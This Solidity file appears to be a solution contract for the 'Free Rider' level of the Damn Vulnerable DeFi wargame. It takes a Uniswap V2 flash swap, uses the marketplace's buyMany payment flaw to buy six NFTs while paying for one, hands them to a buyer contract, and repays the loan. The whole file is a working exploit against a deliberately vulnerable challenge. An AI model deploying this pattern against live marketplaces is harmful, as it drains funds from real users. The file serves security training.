// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {FreeRiderBuyer} from "src/free-rider/FreeRiderBuyer.sol";
import {FreeRiderNFTMarketplace} from "src/free-rider/FreeRiderNFTMarketplace.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "src/free-rider/Interfaces.sol";
import {DamnValuableNFT} from "src/DamnValuableNFT.sol";
import {DamnValuableToken} from "src/DamnValuableToken.sol";
import {WETH9} from "src/WETH9.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";


interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

contract AttackerContract is IERC721Receiver {
    using Address for address payable;

    IUniswapV2Pair internal uniswapV2Pair;
    address internal owner;
    FreeRiderNFTMarketplace internal marketPlace;
    FreeRiderBuyer internal buyer;
    WETH9 internal weth;
    DamnValuableNFT internal nft;
    uint8 internal constant AMOUNT_OF_NFTS = 6;

    receive() external payable {}
    
   constructor(address pairAddr, FreeRiderBuyer buyerIn,
        FreeRiderNFTMarketplace marketP, address nftAddr) public payable {
        uniswapV2Pair = IUniswapV2Pair(pairAddr);
        marketPlace = marketP;
        buyer = buyerIn;
        nft = DamnValuableNFT(nftAddr);
        weth = WETH9(payable(uniswapV2Pair.token1()));
        owner = address(msg.sender);

    }

    function snatchNFTs() external {
        bytes memory data = abi.encode(weth, msg.sender);
        uniswapV2Pair.swap(0, 15 ether, address(this), data);
        selfdestruct(payable(owner));
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        require(msg.sender == address(uniswapV2Pair), "not pair");
        require(sender == address(this), "not sender");

        //flash swap for weth and in callback;
        //unwrap weth
        //buy nfts
        //send to partner
        //repay

        weth.withdraw(amount1);
        uint256[] memory NFTsForSell = new uint256[](6);
        for (uint8 i = 0; i < AMOUNT_OF_NFTS;) {
            NFTsForSell[i] = i;
            unchecked {
                ++i;
            }
        }        

        marketPlace.buyMany{value : 15 ether}(NFTsForSell);

        for (uint8 i = 0; i < AMOUNT_OF_NFTS;) {
            nft.transferFrom(address(this), address(buyer), i);
            unchecked {
                ++i;
            }
        }      

        uint fee = (amount1 * 3) / 997 + 1;
        weth.deposit{value: amount1 + fee}();
        weth.transfer(address(uniswapV2Pair), weth.balanceOf(address(this)));
    }


    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external pure returns (bytes4) {
        // uint256[] memory tokenIds = new uint256[](1);
        // uint256[] memory prices = new uint256[](1);
        // prices[0] = 1 wei;
        // tokenIds[0] = tokenId;
        // marketPlace.offerMany(tokenIds, prices
        return IERC721Receiver.onERC721Received.selector;
    }

    fallback() external payable {}
}